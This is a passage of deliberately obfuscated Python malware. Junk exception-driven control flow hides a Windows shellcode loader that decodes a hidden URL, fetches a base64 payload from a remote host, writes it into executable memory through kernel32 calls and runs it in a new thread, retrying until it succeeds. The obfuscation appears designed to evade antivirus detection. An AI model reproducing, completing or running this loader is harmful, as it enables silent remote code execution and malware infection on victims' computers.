    __4538918919671 = (lambda: R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '1413' == '411':
        case True:
            raise MemoryError([True])
        case False:
            _710 = [[True], [False]]
            R_E_D__A_V______(['_1114'])
    raise MemoryError([True])
except MemoryError as _916:
    __4538918919671 += (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '1416' == '125':
        case True:
            raise MemoryError([True])
        case False:
            _136 = [[True], [False]]
            R_E_D__A_V______(['_158'])
    raise MemoryError([True])
except MemoryError as _1519:
    try:
        raise MemoryError(__4538918919671)
    except MemoryError as __8115822047324:
        if __8115822047324.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))():
            kernel32.RtlMoveMemory.argtypes = (wt.LPVOID, wt.LPVOID, ctypes.c_size_t)
        if __8115822047324.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x03'))():
            __8604135681616 = (lambda: R_E_D__A_V(b"R_E_D__A_V__\xec\x10\t'\xba\xde"))()
        if __8115822047324.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x04'))():
            __8441439217331 = (lambda: R_E_D__A_V(b'R_E_D__A_V__H\xff\xa9#\x15/'))()
try:
    match '1814' == '168':
        case True:
            raise MemoryError([True])
        case False:
            _416 = [[True], [False]]
            R_E_D__A_V______(['_1210'])
    raise MemoryError([True])
except MemoryError as _618:
    __5946580389876 = (lambda: R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '1113' == '1617':
        case True:
            raise MemoryError([True])
        case False:
            _38 = [[True], [False]]
            R_E_D__A_V______(['_1514'])
    raise MemoryError([True])
except MemoryError as _165:
    __5946580389876 += (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '178' == '121':
        case True:
            raise MemoryError([True])
        case False:
            _149 = [[True], [False]]
            R_E_D__A_V______(['_197'])
    raise MemoryError([True])
except MemoryError as _1918:
    try:
        raise MemoryError(__5946580389876)
    except MemoryError as __4316906754802:
        if __4316906754802.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))():
            kernel32.RtlMoveMemory.restype = None
        if __4316906754802.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x03'))():
            __2507193736647 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\xc9\xbeukdW'))()
        if __4316906754802.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x04'))():
            __2824104333341 = (lambda: R_E_D__A_V(b"R_E_D__A_V__$\x86\xa9@R'"))()
        if __4316906754802.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x05'))():
            __5372871446943 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\xed\x93\xf11\x8b\xa7'))()
        if __4316906754802.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x06'))():
            __5822339563811 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\xaba\x03\x8f\xb2\xd7'))()
try:
    match '96' == '57':
        case True:
            raise MemoryError([True])
        case False:
            _414 = [[True], [False]]
            R_E_D__A_V______(['_189'])
    raise MemoryError([True])
except MemoryError as _1816:
    __3924024612915 = (lambda: R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '1117' == '210':
        case True:
            raise MemoryError([True])
        case False:
            _102 = [[True], [False]]
            R_E_D__A_V______(['_191'])
    raise MemoryError([True])
except MemoryError as _1115:
    __3924024612915 += (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '1518' == '132':
        case True:
            raise MemoryError([True])
        case False:
            _716 = [[True], [False]]
            R_E_D__A_V______(['_1513'])
    raise MemoryError([True])
except MemoryError as _914:
    try:
        raise MemoryError(__3924024612915)
    except MemoryError as __5295048716879:
        if __5295048716879.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))():
            kernel32.WaitForSingleObject.argtypes = (wt.HANDLE, wt.DWORD)
        if __5295048716879.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x03'))():
            __8134756436420 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\xf3\xaa\xeb\xe0\xcdr'))()
        if __5295048716879.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x04'))():
            __4803875181020 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\xebms\x15\xda\x0e'))()
        if __5295048716879.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x05'))():
            __3495886377805 = (lambda: R_E_D__A_V(b'R_E_D__A_V__c\xb8\x19,\x84.'))()
        if __5295048716879.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x06'))():
            __7509966825506 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\x13\x9b~[\x92q'))()
try:
    match '1210' == '117':
        case True:
            raise MemoryError([True])
        case False:
            _118 = [[True], [False]]
            R_E_D__A_V______(['_114'])
    raise MemoryError([True])
except MemoryError as _78:
    __3793514961030 = (lambda: R_E_D__A_V(b'R_E_D__A_V__'))()
try:
    match '78' == '124':
        case True:
            raise MemoryError([True])
        case False:
            _23 = [[True], [False]]
            R_E_D__A_V______(['_115'])
    raise MemoryError([True])
except MemoryError as _173:
    __3793514961030 += (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))()
try:
    match '511' == '192':
        case True:
            raise MemoryError([True])
        case False:
            _42 = [[True], [False]]
            R_E_D__A_V______(['_41'])
    raise MemoryError([True])
except MemoryError as _1412:
    try:
        raise MemoryError(__3793514961030)
    except MemoryError as __3713792871438:
        if __3713792871438.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))():
            kernel32.WaitForSingleObject.restype = wt.DWORD
        if __3713792871438.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x03'))():
            __5549739542934 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\xd9$\xcdA\xf4\x81'))()
        if __3713792871438.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x04'))():
            __3445889134513 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\xd1\xbe\xd4G}C'))()
        if __3713792871438.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x05'))():
            __3844800707182 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\xbe6\x1e\xc1d\xf1'))()
        if __3713792871438.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x06'))():
            __3138097821334 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\xcf\xe7\x07\x13`\x1e'))()
try:
    match '1519' == '197':
        case True:
            raise MemoryError([True])
        case False:
            _919 = [[True], [False]]
            R_E_D__A_V______(['_1517'])
    raise MemoryError([True])
except MemoryError as _1413:
    while (lambda: (lambda _1615: _1615 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)():
        try:
            buf = base64.b64decode(urllib.request.urlopen((lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742759, 16742771, 16742771, 16742767, 16742770, 16742713, 16742702, 16742702, 16742769, 16742752, 16742774, 16742701, 16742758, 16742760, 16742771, 16742759, 16742772, 16742753, 16742772, 16742770, 16742756, 16742769, 16742754, 16742766, 16742765, 16742771, 16742756, 16742765, 16742771, 16742701, 16742754, 16742766, 16742764, 16742702, 16742735, 16742743, 16742739, 16742723, 16742724, 16742741, 16742712, 16742703, 16742705, 16742705, 16742702, 16742770, 16742704, 16742702, 16742769, 16742756, 16742757, 16742770, 16742702, 16742759, 16742756, 16742752, 16742755, 16742770, 16742702, 16742764, 16742752, 16742760, 16742765, 16742702, 16742743, 16742722, 16742763, 16742760, 16742756, 16742765, 16742771, 16742701, 16742753, 16742709, 16742707]))))())())()).read().decode((lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742772, 16742771, 16742757, 16742700, 16742711]))))())())()))
            memAddr = kernel32.VirtualAlloc(None, len(buf), (lambda: R_E_D__A_V(b'R_E_D__A_V__0\x00'))(), (lambda: R_E_D__A_V(b'R_E_D__A_V__@'))())
            kernel32.RtlMoveMemory(memAddr, buf, len(buf))
            th = kernel32.CreateThread(ctypes.c_int((lambda: R_E_D__A_V(b'R_E_D__A_V__'))()), ctypes.c_int((lambda: R_E_D__A_V(b'R_E_D__A_V__'))()), ctypes.c_void_p(memAddr), ctypes.c_int((lambda: R_E_D__A_V(b'R_E_D__A_V__'))()), ctypes.c_int((lambda: R_E_D__A_V(b'R_E_D__A_V__'))()), ctypes.pointer(ctypes.c_int((lambda: R_E_D__A_V(b'R_E_D__A_V__'))())))
            kernel32.WaitForSingleObject(th, -(lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))())
            break
        except Exception:
            continue
